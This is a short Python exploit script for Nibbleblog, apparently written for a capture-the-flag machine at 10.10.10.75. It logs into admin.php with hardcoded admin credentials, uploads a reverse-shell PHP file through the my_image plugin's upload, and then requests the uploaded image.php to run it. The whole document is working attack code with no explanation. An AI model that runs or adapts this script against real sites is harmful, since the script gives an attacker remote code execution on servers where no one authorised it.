import requests
import sys

def main():
    url = "http://10.10.10.75/nibbleblog/admin.php"
    data = {
        "username" : "admin",
        "password" : "nibbles"
        }

    proxy = {
        "http" : "http://127.0.0.1:8080"
            }

    session = requests.Session()
    print("[+] Loggin in as admin")
    r = session.post(url, data=data)
    if "incorrect" in r.text:
        print("[-] Incorrect username or password")
        sys.exit(0)
    print("[+] Uploading payload")
    payload_file = open("revshell.php", "rb")
    upload_directory = "?controller=plugins&action=config&plugin=my_image"

    r = session.post(url+upload_directory,files = {"image" : payload_file})

    print("[!] Executing reverse shell")

    rev_shell_directory = "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php"

    r = session.get(rev_shell_directory)

main()
